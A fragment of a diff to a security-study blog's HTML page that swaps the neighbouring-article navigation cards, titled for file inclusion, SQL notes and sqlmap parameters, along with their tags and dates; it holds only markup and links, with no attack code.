-                        <span class="chip bg-color">漏洞原理分析</span>
-                    </a>
-                    
-                    <a href="/tags/csrf%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">csrf学习</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/02/03/wen-jian-bao-han-yuan-li/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="文件包含原理">
-                        
-                        <span class="card-title">文件包含原理</span>
+                        <span class="card-title">sql学习笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -888,6 +704,7 @@ ASPX一句话
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -895,8 +712,57 @@ ASPX一句话
                         <span class="chip bg-color">漏洞原理分析</span>
                     </a>
                     
-                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">文件包含漏洞学习</span>
+                    <a href="/tags/sql%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">sql学习</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/02/03/sqlmap-ming-ling-xing-can-shu-jie-xi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="sqlmap命令行参数解析">
+                        
+                        <span class="card-title">sqlmap命令行参数解析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/sqlmap/" class="post-category">
+                                    sqlmap
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sqlmap%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E6%B1%87%E6%80%BB/">
+                        <span class="chip bg-color">sqlmap命令参数汇总</span>
                     </a>
                     
                 </div>
